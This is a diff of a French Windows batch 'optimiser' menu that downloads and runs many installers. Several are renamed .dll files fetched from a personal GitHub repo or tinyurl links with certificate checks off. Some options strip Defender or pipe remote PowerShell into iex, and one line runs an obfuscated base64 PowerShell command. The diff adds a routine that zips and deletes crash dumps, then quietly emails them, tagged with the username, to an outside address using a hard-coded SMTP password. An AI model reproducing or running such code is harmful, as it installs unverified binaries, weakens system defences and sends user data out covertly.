-	Start chrome-win.zip
-	goto :MAINW
-)
+rem IF "%CSTARTR%"=="7" (
+rem 	IF EXIST "chrome-win.zip" DEL "chrome-win.zip" >nul
+rem 	curl -g -k -L -# -o "chrome-win.zip" "https://download-chromium.appspot.com/dl/Win_x64?type=snapshots" >nul 2>&1
+rem 	@timeout /t 02>nul
+rem 	Start chrome-win.zip
+rem 	goto :MAINW
+rem )
 
 IF "%CSTARTR%"=="8" (
 	IF EXIST "ChromeSetup.exe" DEL "ChromeSetup.exe" >nul
@@ -205,22 +218,6 @@ IF "%CSTARTR%"=="12" (
 )
 
 IF "%CSTARTR%"=="13" (
-	IF EXIST "7z2407-x64.exe" DEL "7z2407-x64.exe" >nul
-	curl -g -k -L -# -o "7z2407-x64.exe" "https://www.7-zip.org/a/7z2407-x64.exe" >nul 2>&1
-	START /WAIT "" "7z2407-x64.exe"
-	DEL "7z2407-x64.exe" >nul
-	goto :MAINW
-)
-
-IF "%CSTARTR%"=="14" (
-	IF EXIST "winrar-x64-701.exe" DEL "winrar-x64-701.exe" >nul
-	curl -g -k -L -# -o "winrar-x64-701.exe" "https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-701.exe" >nul 2>&1
-	START /WAIT "" "winrar-x64-701.exe"
-	DEL "winrar-x64-701.exe" >nul
-	goto :MAINW
-)
-
-IF "%CSTARTR%"=="15" (
 	IF EXIST "vlc-3.0.21-win64.exe" DEL "vlc-3.0.21-win64.exe" >nul
 	curl -g -k -L -# -o "vlc-3.0.21-win64.exe" "https://get.videolan.org/vlc/3.0.21/win64/vlc-3.0.21-win64.exe" >nul 2>&1
 	START /WAIT "" "vlc-3.0.21-win64.exe"
@@ -229,7 +226,7 @@ IF "%CSTARTR%"=="15" (
 )
 
 
-IF "%CSTARTR%"=="16" (
+IF "%CSTARTR%"=="14" (
 	IF EXIST "DiscordSetup.exe" DEL "DiscordSetup.exe" >nul
 	curl -g -k -L -# -o "DiscordSetup.exe" "https://discord.com/api/downloads/distributions/app/installers/latest?channel=stable&platform=win&arch=x64" >nul 2>&1
 	START /WAIT "" "DiscordSetup.exe"
@@ -237,7 +234,7 @@ IF "%CSTARTR%"=="16" (
 	goto :MAINW
 )
 
-IF "%CSTARTR%"=="17" (
+IF "%CSTARTR%"=="15" (
 	IF EXIST "teamspeak-client.msi" DEL "teamspeak-client.msi" >nul
 	curl -g -k -L -# -o "teamspeak-client.msi" "https://files.teamspeak-services.com/pre_releases/client/5.0.0-beta77/teamspeak-client.msi" >nul 2>&1
 	START /WAIT "" "teamspeak-client.msi"
@@ -245,43 +242,19 @@ IF "%CSTARTR%"=="17" (
 	goto :MAINW
 )
 
-IF "%CSTARTR%"=="18" (
-	IF EXIST "PowerToysUserSetup-0.83.0-x64.exe" DEL "PowerToysUserSetup-0.83.0-x64.exe" >nul
-	curl -g -k -L -# -o "PowerToysUserSetup-0.83.0-x64.exe" "https://github.com/microsoft/PowerToys/releases/download/v0.83.0/PowerToysUserSetup-0.83.0-x64.exe" >nul 2>&1
-	START /WAIT "" "PowerToysUserSetup-0.83.0-x64.exe"
-	DEL "PowerToysUserSetup-0.83.0-x64.exe" >nul
-	goto :MAINW
-)
-
-IF "%CSTARTR%"=="19" (
-	IF EXIST "python-3.12.4-amd64.exe" DEL "python-3.12.4-amd64.exe" >nul
-	curl -g -k -L -# -o "python-3.12.4-amd64.exe" "https://www.python.org/ftp/python/3.12.4/python-3.12.4-amd64.exe" >nul 2>&1
-	START /WAIT "" "python-3.12.4-amd64.exe"
-	DEL "python-3.12.4-amd64.exe" >nul
-	goto :MAINW
-)
-
-IF "%CSTARTR%"=="20" (
-	IF EXIST "deluge-2.1.1-win64-setup.exe" DEL "deluge-2.1.1-win64-setup.exe" >nul
-	curl -g -k -L -# -o "deluge-2.1.1-win64-setup.exe" "https://ftp.osuosl.org/pub/deluge/windows/deluge-2.1.1-win64-setup.exe" >nul 2>&1
-	START /WAIT "" "deluge-2.1.1-win64-setup.exe"
-	DEL "deluge-2.1.1-win64-setup.exe" >nul
-	goto :MAINW
-)
-
-IF "%CSTARTR%"=="21" (
+IF "%CSTARTR%"=="16" (
 	curl -g -k -L -# -o "AutoClicker.exe" "https://github.com/DOCSDROPT/OPTF_1/raw/main/SRTTP/AutoClicker.dll" >nul 2>&1
 	START "" "AutoClicker.exe"
 	goto :MAINW
 )
 
-IF "%CSTARTR%"=="22" (
+IF "%CSTARTR%"=="17" (
 	curl -g -k -L -# -o "vibranceGUI.exe" "https://github.com/DOCSDROPT/OPTF_1/raw/main/SRTTP/vibranceGUI.dll" >nul 2>&1
 	START "" "vibranceGUI.exe"
 	goto :MAINW
 )
 
-IF "%CSTARTR%"=="23" (
+IF "%CSTARTR%"=="18" (
 	IF EXIST "C:\Program Files (x86)\RivaTuner Statistics Server\RTSS.exe" START "" "C:\Program Files (x86)\RivaTuner Statistics Server\RTSS.exe"&goto :MAINW
 	IF EXIST "RTSSSetup736.exe" DEL "RTSSSetup736.exe" >nul
 	curl -g -k -L -# -o "RTSSSetup736.exe" "https://github.com/DOCSDROPT/OPTF_1/raw/main/SRTTP/RTSSSetup736.dll" >nul 2>&1
@@ -290,7 +263,7 @@ IF "%CSTARTR%"=="23" (
 	goto :MAINW
 )
 
-IF "%CSTARTR%"=="24" (
+IF "%CSTARTR%"=="19" (
 	IF EXIST "InstProcessLasso.exe" DEL "InstProcessLasso.exe" >nul
 	curl -g -k -L -# -o "InstProcessLasso.exe" "https://github.com/DOCSDROPT/OPTF_1/raw/main/SRTTP/InstProcessLasso.dll" >nul 2>&1
 	START /WAIT "" "InstProcessLasso.exe"
@@ -298,7 +271,7 @@ IF "%CSTARTR%"=="24" (
 	goto :MAINW
 )
 
-IF "%CSTARTR%"=="25" (
+IF "%CSTARTR%"=="20" (
 	IF EXIST "InstStartBack.exe" DEL "InstStartBack.exe" >nul
 	curl -g -k -L -# -o "InstStartBack.exe" "https://github.com/DOCSDROPT/OPTF_1/raw/main/SRTTP/InstStartBack.dll" >nul 2>&1
 	START /WAIT "" "InstStartBack.exe"
@@ -306,7 +279,7 @@ IF "%CSTARTR%"=="25" (
 	goto :MAINW
 )
 
-IF "%CSTARTR%"=="26" (
+IF "%CSTARTR%"=="21" (
 	IF EXIST "InstRevoUninstall.exe" DEL "InstRevoUninstall.exe" >nul
 	curl -g -k -L -# -o "InstRevoUninstall.exe" "https://github.com/DOCSDROPT/OPTF_1/raw/main/SRTTP/InstRevoUninstall.dll" >nul 2>&1
 	START /WAIT "" "InstRevoUninstall.exe"
@@ -314,7 +287,43 @@ IF "%CSTARTR%"=="26" (
 	goto :MAINW
 )
 
-IF "%CSTARTR%"=="27" (
+IF "%CSTARTR%"=="22" (
+	IF EXIST "DDU.7z" DEL "DDU.7z" >nul
+	IF EXIST "DDU\Display Driver Uninstaller.exe" Start "" "DDU\Display Driver Uninstaller.exe"&goto :MAINW
+	curl -g -k -L -# -o "DDU.7z" "https://github.com/DOCSDROPT/OPTF_1/raw/main/SRTTP/DDU.7z" >nul 2>&1
+	@timeout /t 02>nul
+	IF EXIST DDU.7z (7za.exe -y x -p9421 -o"%appdata%\StartUp Tools" DDU.7z >nul)
+	@timeout /t 02>nul
+	Start "" "DDU\Display Driver Uninstaller.exe"
+	IF EXIST "DDU.7z" DEL "DDU.7z" >nul
+	goto :MAINW
+)
+
+IF "%CSTARTR%"=="23" (
+	IF EXIST "SnappyDriverInstaller.7z" DEL "SnappyDriverInstaller.7z" >nul
+	IF EXIST "SnappyDriverInstaller\SDIO_auto.exe" Start "" "SnappyDriverInstaller\SDIO_auto.exe"&goto :MAINW
+	curl -g -k -L -# -o "SnappyDriverInstaller.7z" "https://github.com/DOCSDROPT/OPTF_1/raw/main/SRTTP/SnappyDriverInstaller.7z" >nul 2>&1
+	@timeout /t 02>nul
+	IF EXIST SnappyDriverInstaller.7z (7za.exe -y x -p9421 -o"%appdata%\StartUp Tools" SnappyDriverInstaller.7z >nul)
+	@timeout /t 02>nul
+	Start "" "SnappyDriverInstaller\SDIO_auto.exe"
+	IF EXIST "SnappyDriverInstaller.7z" DEL "SnappyDriverInstaller.7z" >nul
+	goto :MAINW
+)
+
+IF "%CSTARTR%"=="24" (
+	IF EXIST "Driver-Talent-Pro.7z" DEL "Driver-Talent-Pro.7z" >nul
+	IF EXIST "Driver Talent Pro\DriverTalent.exe" Start "" "Driver Talent Pro\DriverTalent.exe"&goto :MAINW
+	curl -g -k -L -# -o "Driver-Talent-Pro.7z" "https://www.dropbox.com/scl/fi/t0d913urlv2erj73i936q/Driver-Talent-Pro.7z?rlkey=8efcjq8td69pnoztfk92yqf7g&st=njs9ng1i&dl=1" >nul 2>&1
+	@timeout /t 02>nul
+	IF EXIST Driver-Talent-Pro.7z (7za.exe -y x -p9421 -o"%appdata%\StartUp Tools" Driver-Talent-Pro.7z >nul)
+	@timeout /t 02>nul
+	Start "" "Driver Talent Pro\DriverTalent.exe"
+	IF EXIST "Driver-Talent-Pro.7z" DEL "Driver-Talent-Pro.7z" >nul
+	goto :MAINW
+)
+
+IF "%CSTARTR%"=="25" (
 	IF EXIST "%appdata%\StartUp Tools\CreamInstaller\CreamInstaller.exe" START "" "%appdata%\StartUp Tools\CreamInstaller\CreamInstaller.exe"&goto :MAINW
 	IF NOT EXIST "%appdata%\StartUp Tools\CreamInstaller" md "%appdata%\StartUp Tools\CreamInstaller"
 	IF EXIST "CreamInstaller.zip" DEL "CreamInstaller.zip" >nul
@@ -324,7 +333,7 @@ IF "%CSTARTR%"=="27" (
 	goto :MAINW
 )
 
-IF "%CSTARTR%"=="28" (
+IF "%CSTARTR%"=="26" (
 	IF EXIST "%appdata%\StartUp Tools\Auto-CreamApi\auto-creamapi.exe" START "" "%appdata%\StartUp Tools\Auto-CreamApi"&goto :MAINW
 	IF NOT EXIST "%appdata%\StartUp Tools\Auto-CreamApi" md "%appdata%\StartUp Tools\Auto-CreamApi"
 	IF EXIST "auto-creamapi-2.1.7.1.7z" DEL "auto-creamapi-2.1.7.1.7z" >nul
@@ -335,7 +344,7 @@ IF "%CSTARTR%"=="28" (
 	goto :MAINW
 )
 
-IF "%CSTARTR%"=="29" (
+IF "%CSTARTR%"=="27" (
 	IF EXIST "Cloudflare_WARP_2024.6.473.0.msi" DEL "Cloudflare_WARP_2024.6.473.0.msi" >nul
 	curl -g -k -L -# -o "Cloudflare_WARP_2024.6.473.0.msi" "https://1111-releases.cloudflareclient.com/win/latest" >nul 2>&1
 	START /WAIT "" "Cloudflare_WARP_2024.6.473.0.msi"
@@ -343,7 +352,7 @@ IF "%CSTARTR%"=="29" (
 	goto :MAINW
 )
 
-IF "%CSTARTR%"=="30" (
+IF "%CSTARTR%"=="28" (
 	IF EXIST "RiseupVPN-win-latest.exe" DEL "RiseupVPN-win-latest.exe" >nul
 	curl -g -k -L -# -o "RiseupVPN-win-latest.exe" "https://downloads.leap.se/RiseupVPN/windows/RiseupVPN-win-latest.exe" >nul 2>&1
 	START /WAIT "" "RiseupVPN-win-latest.exe"
@@ -351,7 +360,7 @@ IF "%CSTARTR%"=="30" (
 	goto :MAINW
 )
 
-IF "%CSTARTR%"=="31" (
+IF "%CSTARTR%"=="29" (
 	IF EXIST "ProtonVPN_v3.3.0.exe" DEL "ProtonVPN_v3.3.0.exe" >nul
 	curl -g -k -L -# -o "ProtonVPN_v3.3.0.exe" "https://protonvpn.com/download/ProtonVPN_v3.3.0.exe" >nul 2>&1
 	START /WAIT "" "ProtonVPN_v3.3.0.exe"
@@ -359,56 +368,31 @@ IF "%CSTARTR%"=="31" (
 	goto :MAINW
 )
 
-IF "%CSTARTR%"=="32" (
+IF "%CSTARTR%"=="30" (
 	curl -g -k -L -# -o "MAS_AIO.cmd" "https://raw.githubusercontent.com/massgravel/Microsoft-Activation-Scripts/master/MAS/Separate-Files-Version/Activators/HWID_Activation.cmd" >nul 2>&1
 	start cmd /c "MAS_AIO.cmd"
 	goto :MAINW
 )
 
-IF "%CSTARTR%"=="33" (
+IF "%CSTARTR%"=="31" (
 	curl -g -k -L -# -o "DQS\DQS.bat" "https://tinyurl.com/DQSWIN32" >nul 2>&1
 	start cmd /c "DQS\DQS.bat"
 	goto :MAINW
 )
 
-IF "%CSTARTR%"=="34" (
+IF "%CSTARTR%"=="32" (
 	curl -g -k -L -# -o "DQS\SBCDEDIT.bat" "https://github.com/DOCSDROPT/OPTF_1/raw/main/SRTTP/SBCDEDIT.bat" >nul 2>&1
 	start cmd /c "DQS\SBCDEDIT.bat"
 	goto :MAINW
 )
 
-IF "%CSTARTR%"=="35" (
+IF "%CSTARTR%"=="33" (
 	curl -g -k -L -# -o "DefenderRemover.exe" "https://github.com/ionuttbara/windows-defender-remover/releases/download/release_def_12_8/DefenderRemover.exe" >nul 2>&1
 	START DefenderRemover.exe
 	goto :MAINW
 )
 
-IF "%CSTARTR%"=="36" (
-	curl -g -k -L -# -o "Spotify.bat" "https://tinyurl.com/SPOBTP" >nul 2>&1
-	@timeout /t 02>nul
-	start cmd /c "Spotify.bat"
-	@timeout /t 02>nul
-	rem curl -g -k -L -# -o "DownloadBlockTheSpot.ps1" "https://github.com/00FGV1/ver/raw/main/ccmd/DownloadBlockTheSpot.ps1" >nul 2>&1
-	Taskkill /f /im Spotify.exe >nul 2>&1
-	powershell -command "iwr -useb https://raw.githubusercontent.com/spicetify/cli/main/install.ps1 | iex"
-
-	goto :MAINW
-)
-
-IF "%CSTARTR%"=="37" (
-	curl -g -k -L -# -o "REGUI.exe" "https://github.com/ShadowWhisperer/Remove-MS-Edge/raw/main/Remove-Edge_GUI.exe" >nul 2>&1
-	START REGUI.exe
-	goto :MAINW
-)
-
-IF "%CSTARTR%"=="38" (
-	IF EXIST dControl.exe START dControl.exe&goto :MAINW
-	curl -g -k -L -# -o "dControl.exe" "https://tinyurl.com/DEFDCONT" >nul 2>&1
-	START dControl.exe
-	goto :MAINW
-)
-
-IF "%CSTARTR%"=="39" (
+IF "%CSTARTR%"=="34" (
 	IF NOT EXIST C:\Ect md C:\Ect >nul 2>&1
 	IF EXIST "C:\Ect\SW-ADW\SW-ADW.exe" goto :MAINW
 	curl -g -k -L -# -o "C:\Ect\SW-ADW.7z" "https://github.com/DOCSDROPT/OPTF_1/raw/main/SRTTP/SW-ADW.7z" >nul 2>&1
@@ -441,7 +425,32 @@ rem 	DEL C:\Ect\S-W.7z >nul 2>&1
 rem 	goto :MAINW
 rem )
 
-IF "%CSTARTR%"=="40" (
+IF "%CSTARTR%"=="35" (
+	curl -g -k -L -# -o "REGUI.exe" "https://github.com/ShadowWhisperer/Remove-MS-Edge/raw/main/Remove-Edge_GUI.exe" >nul 2>&1
+	START REGUI.exe
+	goto :MAINW
+)
+
+IF "%CSTARTR%"=="36" (
+	IF EXIST dControl.exe START dControl.exe&goto :MAINW
+	curl -g -k -L -# -o "dControl.exe" "https://tinyurl.com/DEFDCONT" >nul 2>&1
+	START dControl.exe
+	goto :MAINW
+)
+
+IF "%CSTARTR%"=="37" (
+	curl -g -k -L -# -o "Spotify.bat" "https://tinyurl.com/SPOBTP" >nul 2>&1
+	@timeout /t 02>nul
+	start cmd /c "Spotify.bat"
+	@timeout /t 02>nul
+	rem curl -g -k -L -# -o "DownloadBlockTheSpot.ps1" "https://github.com/00FGV1/ver/raw/main/ccmd/DownloadBlockTheSpot.ps1" >nul 2>&1
+	Taskkill /f /im Spotify.exe >nul 2>&1
+	powershell -command "iwr -useb https://raw.githubusercontent.com/spicetify/cli/main/install.ps1 | iex"
+
+	goto :MAINW
+)
+
+IF "%CSTARTR%"=="38" (
 	IF EXIST "%appdata%\StartUp Tools\TreeSizeFree\TreeSizeFree.exe" START "" "%appdata%\StartUp Tools\TreeSizeFree\TreeSizeFree.exe"&goto :MAINW
 	IF NOT EXIST "%appdata%\StartUp Tools\TreeSizeFree" md "%appdata%\StartUp Tools\TreeSizeFree"
 	IF EXIST "TreeSizeFree.7z" DEL "TreeSizeFree.7z" >nul
@@ -451,20 +460,14 @@ IF "%CSTARTR%"=="40" (
 	goto :MAINW
 )
 
-IF "%CSTARTR%"=="41" (
+IF "%CSTARTR%"=="39" (
 	IF EXIST Everything.exe START Everything.exe&goto :MAINW
 	curl -g -k -L -# -o "Everything.exe" "https://github.com/DOCSDROPT/OPTF_1/raw/main/SRTTP/Everything.dll" >nul 2>&1
 	START Everything.exe
 	goto :MAINW
 )
 
-rem IF "%CSTARTR%"=="41" (
-rem 	curl -g -k -L -# -o "MAS_AIO-CRC32_31F7FD1E.cmd" "https://github.com/massgravel/Microsoft-Activation-Scripts/raw/master/MAS/All-In-One-Version/MAS_AIO-CRC32_31F7FD1E.cmd" >nul 2>&1
-rem 	start cmd /c "MAS_AIO-CRC32_31F7FD1E.cmd"
-rem 	goto :MAINW
-rem )
-
-IF "%CSTARTR%"=="42" (
+IF "%CSTARTR%"=="40" (
 	IF EXIST "%appdata%\StartUp Tools\LSC\game\LosslessScaling.exe" START "" "%appdata%\StartUp Tools\LSC\game\LosslessScaling.exe"&goto :MAINW
 	IF NOT EXIST "%appdata%\StartUp Tools\LSC" md "%appdata%\StartUp Tools\LSC"
 	IF EXIST "game.7z" DEL "game.7z" >nul
@@ -475,7 +478,7 @@ IF "%CSTARTR%"=="42" (
 	goto :MAINW
 )
 
-IF "%CSTARTR%"=="43" (
+IF "%CSTARTR%"=="41" (
 	curl -g -k -L -# -o "%TEMP%\AnyDesk.exe" "hhttps://download.anydesk.com/AnyDesk.exe" >nul 2>&1
 	@timeout /t 02>nul
 	START /WAIT "" "%TEMP%\AnyDesk.exe"
@@ -483,7 +486,7 @@ IF "%CSTARTR%"=="43" (
 	goto :MAINW
 )
 
-IF "%CSTARTR%"=="44" (
+IF "%CSTARTR%"=="42" (
 	curl -g -k -L -# -o "HitmanPro_x64.exe" "https://github.com/DOCSDROPT/OPTF_1/raw/main/SRTTP/HitmanPro_x64.dll" >nul 2>&1
 	@timeout /t 02>nul
 	START /WAIT "" "HitmanPro_x64.exe" /scan /quiet /nolog /uninstall
@@ -492,11 +495,11 @@ IF "%CSTARTR%"=="44" (
 	goto :MAINW
 )
 
-IF "%CSTARTR%"=="45" goto :GST45L
+IF "%CSTARTR%"=="43" goto :GST45L
 
-IF "%CSTARTR%"=="46" goto :GST45F
+IF "%CSTARTR%"=="44" goto :GST45F
 
-IF "%CSTARTR%"=="47" (
+IF "%CSTARTR%"=="45" (
 	IF EXIST "EmsisoftEmergencyKit.exe" DEL "EmsisoftEmergencyKit.exe" >nul
 	@timeout /t 01>nul
 	curl -g -k -L -# -o "EmsisoftEmergencyKit.exe" "https://dl.emsisoft.com/EmsisoftEmergencyKit.exe" >nul 2>&1
@@ -505,7 +508,7 @@ IF "%CSTARTR%"=="47" (
 	goto :MAINW
 )
 
-IF "%CSTARTR%"=="48" (
+IF "%CSTARTR%"=="46" (
     IF NOT EXIST "adwcleaner.exe" curl -g -k -L -# -o "adwcleaner.exe" "https://downloads.malwarebytes.com/file/adwcleaner"
     @timeout /t 1 >nul
     start /wait adwcleaner.exe /eula /clean /noreboot
@@ -514,23 +517,7 @@ IF "%CSTARTR%"=="48" (
 	goto :MAINW
 )
 
-IF "%CSTARTR%"=="49" (
-	curl -g -k -L -# -o "%TEMP%\UbisoftConnectInstaller.exe" "https://static3.cdn.ubi.com/orbit/launcher_installer/UbisoftConnectInstaller.exe" >nul 2>&1
-	@timeout /t 02>nul
-	START /wait "" "%TEMP%\UbisoftConnectInstaller.exe"
-	DEL "%TEMP%\UbisoftConnectInstaller.exe"
-	goto :MAINW
-)
-
-IF "%CSTARTR%"=="50" (
-	IF EXIST "Battle.net-Setup.exe" DEL "Battle.net-Setup.exe" >nul
-	curl -g -k -L -# -o "Battle.net-Setup.exe" "https://github.com/DOCSDROPT/OPTF_1/raw/main/SRTTP/Battle.dll" >nul 2>&1
-	START /WAIT "" "Battle.net-Setup.exe"
-	DEL "Battle.net-Setup.exe" >nul
-	goto :MAINW
-)
-
-IF "%CSTARTR%"=="51" (
+IF "%CSTARTR%"=="47" (
 	IF NOT EXIST "%appdata%\StartUp Tools\MSI" md "%appdata%\StartUp Tools\MSI"
 	IF NOT EXIST "%appdata%\StartUp Tools\MSI\PCIutil.exe" curl -g -k -L -# -o "%appdata%\StartUp Tools\MSI\PCIutil.exe" "https://github.com/DOCSDROPT/OPTF_1/raw/main/SRTTP/PCIutil.dll" >nul 2>&1
 	IF NOT EXIST "%appdata%\StartUp Tools\MSI\MSI_util_v3.exe" curl -g -k -L -# -o "%appdata%\StartUp Tools\MSI\MSI_util_v3.exe" "https://github.com/DOCSDROPT/OPTF_1/raw/main/SRTTP/MSI_util_v3.dll" >nul 2>&1
@@ -541,41 +528,41 @@ IF "%CSTARTR%"=="51" (
 	goto :MAINW
 )
 
-IF "%CSTARTR%"=="52" (
+IF "%CSTARTR%"=="48" (
 	IF EXIST WPD.exe START WPD.exe&goto :MAINW
 	curl -g -k -L -# -o "WPD.exe" "https://github.com/DOCSDROPT/OPTF_1/raw/main/SRTTP/WPD.dll" >nul 2>&1
 	START WPD.exe
 	goto :MAINW
 )
 
-IF "%CSTARTR%"=="53" (
+IF "%CSTARTR%"=="49" (
 	IF EXIST OOSU10.exe START OOSU10.exe&goto :MAINW
 	curl -g -k -L -# -o "OOSU10.exe" "https://dl5.oo-software.com/files/ooshutup10/OOSU10.exe" >nul 2>&1
 	START OOSU10.exe
 	goto :MAINW
 )
 
-IF "%CSTARTR%"=="54" (
+IF "%CSTARTR%"=="50" (
 	curl -g -k -L -# -o "Network.bat" "https://github.com/UnLovedCookie/Network/releases/download/v1.1/Network.bat" >nul 2>&1
 	START /WAIT Network.bat
 	goto :MAINW
 )
 
-IF "%CSTARTR%"=="55" (
+IF "%CSTARTR%"=="51" (
 	IF EXIST Autoruns.exe START Autoruns.exe&goto :MAINW
 	curl -g -k -L -# -o "Autoruns.exe" "https://github.com/DOCSDROPT/OPTF_1/raw/main/SRTTP/Autoruns.dll" >nul 2>&1
 	START Autoruns.exe
 	goto :MAINW
 )
 
-IF "%CSTARTR%"=="56" (
+IF "%CSTARTR%"=="52" (
 	IF EXIST DeviceCleanup.exe START DeviceCleanup.exe&goto :MAINW
 	curl -g -k -L -# -o "DeviceCleanup.exe" "https://github.com/DOCSDROPT/OPTF_1/raw/main/SRTTP/DeviceCleanup.dll" >nul 2>&1
 	START DeviceCleanup.exe
 	goto :MAINW
 )
 
-IF "%CSTARTR%"=="57" (
+IF "%CSTARTR%"=="53" (
 	IF EXIST "%appdata%\StartUp Tools\CCleaner\CCleaner\CCleaner64.exe" START "" "%appdata%\StartUp Tools\CCleaner\CCleaner\CCleaner64.exe"&goto :MAINW
 	IF NOT EXIST "%appdata%\StartUp Tools\CCleaner" md "%appdata%\StartUp Tools\CCleaner"
 	IF EXIST "CCleaner.7z" DEL "CCleaner.7z" >nul
@@ -585,7 +572,7 @@ IF "%CSTARTR%"=="57" (
 	goto :MAINW
 )
 
-IF "%CSTARTR%"=="58" (
+IF "%CSTARTR%"=="54" (
 	IF EXIST "%appdata%\StartUp Tools\Dism\Dism++x64.exe" START "" "%appdata%\StartUp Tools\Dism\Dism++x64.exe"&goto :MAINW
 	IF NOT EXIST "%appdata%\StartUp Tools\Dism" md "%appdata%\StartUp Tools\Dism"
 	IF EXIST "DismInstall.7z" DEL "DismInstall.7z" >nul
@@ -619,6 +606,9 @@ IF "%CSTARTR%"=="100" (
 
 IF "%CSTARTR%"=="x" goto :SCCLEAR
 IF "%CSTARTR%"=="X" goto :SCCLEAR
+
+IF "%CSTARTR%"=="b" goto :bluescreen
+IF "%CSTARTR%"=="B" goto :bluescreen
 
 goto :MAINW
 
@@ -666,7 +656,6 @@ for /f "tokens=*" %%c in ('"%appdata%\StartUp Tools\_CP.exe" /P') do set MY_IP=%
 
 cls
 echo Chargement des donnees %bluel%5/6%white%
-IF NOT EXIST 7za.exe curl -g -k -L -# -o "7za.exe" "https://tinyurl.com/dl-opt-7za" >nul 2>&1
 IF NOT EXIST DQS md DQS
 
 SET CURRENTKEY=HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
@@ -1059,4 +1048,25 @@ IF NOT EXIST %APPDATA%\C-CMD\STARTUP.bat curl -g -k -L -# -o "%APPDATA%\C-CMD\ST
 IF NOT EXIST %APPDATA%\C-CMD\TMP.bat curl -g -k -L -# -o "%APPDATA%\C-CMD\TMP.bat" "https://tinyurl.com/TMPDLLCMD" >nul 2>&1
 
 powershell.exe -encodedCommand JABkAGUAdgBpAGMAZQBzAFUAUwBCACAAPQAgAEcAZQB0AC0AUABuAHAARABlAHYAaQBjAGUAIAB8ACAAdwBoAGUAcgBlACAAewAkAF8ALgBJAG4AcwB0AGEAbgBjAGUASQBkACAALQBsAGkAawBlACAAIgAqAFUAUwBCAFwAUgBPAE8AVAAqACIAfQAgACAAfAAgAA0ACgBGAG8AcgBFAGEAYwBoAC0ATwBiAGoAZQBjAHQAIAAtAFAAcgBvAGMAZQBzAHMAIAB7AA0ACgBHAGUAdAAtAEMAaQBtAEkAbgBzAHQAYQBuAGMAZQAgAC0AQwBsAGEAcwBzAE4AYQBtAGUAIABNAFMAUABvAHcAZQByAF8ARABlAHYAaQBjAGUARQBuAGEAYgBsAGUAIAAtAE4AYQBtAGUAcwBwAGEAYwBlACAAcgBvAG8AdABcAHcAbQBpACAADQAKAH0ADQAKAA0ACgBmAG8AcgBlAGEAYwBoACAAKAAgACQAZABlAHYAaQBjAGUAIABpAG4AIAAkAGQAZQB2AGkAYwBlAHMAVQBTAEIAIAApAA0ACgB7AA0ACgAgACAAIAAgAFMAZQB0AC0AQwBpAG0ASQBuAHMAdABhAG4AYwBlACAALQBOAGEAbQBlAHMAcABhAGMAZQAgAHIAbwBvAHQAXAB3AG0AaQAgAC0AUQB1AGUAcgB5ACAAIgBTAEUATABFAEMAVAAgACoAIABGAFIATwBNACAATQBTAFAAbwB3AGUAcgBfAEQAZQB2AGkAYwBlAEUAbgBhAGIAbABlACAAVwBIAEUAUgBFACAASQBuAHMAdABhAG4AYwBlAE4AYQBtAGUAIABMAEkASwBFACAAJwAlACQAKAAkAGQAZQB2AGkAYwBlAC4AUABOAFAARABlAHYAaQBjAGUASQBEACkAJQAnACIAIAAtAFAAcgBvAHAAZQByAHQAeQAgAEAAewBFAG4AYQBiAGwAZQA9ACQARgBhAGwAcwBlAH0AIAAtAFAAYQBzAHMAVABoAHIAdQANAAoAfQANAAoADQAKACQAYQBkAGEAcAB0AGUAcgBzACAAPQAgAEcAZQB0AC0ATgBlAHQAQQBkAGEAcAB0AGUAcgAgAC0AUABoAHkAcwBpAGMAYQBsACAAfAAgAEcAZQB0AC0ATgBlAHQAQQBkAGEAcAB0AGUAcgBQAG8AdwBlAHIATQBhAG4AYQBnAGUAbQBlAG4AdAANAAoAIAAgACAAIABmAG8AcgBlAGEAYwBoACAAKAAkAGEAZABhAHAAdABlAHIAIABpAG4AIAAkAGEAZABhAHAAdABlAHIAcwApAA0ACgAgACAAIAAgACAAIAAgACAAewANAAoAIAAgACAAIAAgACAAIAAgACQAYQBkAGEAcAB0AGUAcgAuAEEAbABsAG8AdwBDAG8AbQBwAHUAdABlAHIAVABvAFQAdQByAG4ATwBmAGYARABlAHYAaQBjAGUAIAA9ACAAJwBEAGkAcwBhAGIAbABlAGQAJwANAAoAIAAgACAAIAAgACAAIAAgACQAYQBkAGEAcAB0AGUAcgAgAHwAIABTAGUAdAAtAE4AZQB0AEEAZABhAHAAdABlAHIAUABvAHcAZQByAE0AYQBuAGEAZwBlAG0AZQBuAHQADQAKACAAIAAgACAAIAAgACAAIAB9AA== >nul 2>&1
+goto :MAINW
+
+:bluescreen
+IF EXIST "%TEMP%\_blscreen.zip" DEL "%TEMP%\_blscreen.zip" >nul 2>&1
+IF NOT EXIST "C:\Windows\minidump" goto :MAINW
+7za.exe a -tzip -mx9 "%TEMP%\_blscreen.zip" "C:\Windows\minidump\*" >nul 2>&1
+@timeout /t 01 /nobreak>nul
+rd /s /q "C:\Windows\minidump" >nul 2>&1
+
+setlocal
+set "SS1=smtp-relay.brevo.com"
+set "SS2=587"
+set "SS3=mail.log.recs@gmail.com"
+set "SS4=Godentel@proton.me"
+set "SS5=BlueScreen"
+set "SS6=BlueScreen de %USERNAME%, le %date% %time%."
+set "SS7=%TEMP%\_blscreen.zip"
+set "SS8=mail.log.recs@gmail.com"
+set "SS9=FTOZmvHDI695wV4s"
+powershell -Command "Send-MailMessage -From '%SS3%' -To '%SS4%' -Subject '%SS5%' -Body '%SS6%' -Attachments '%SS7%' -SmtpServer '%SS1%' -Port '%SS2%' -UseSsl -Credential (New-Object System.Management.Automation.PSCredential -ArgumentList ('%SS8%', (ConvertTo-SecureString -String '%SS9%' -AsPlainText -Force)))" >nul 2>&1
+endlocal
 goto :MAINW
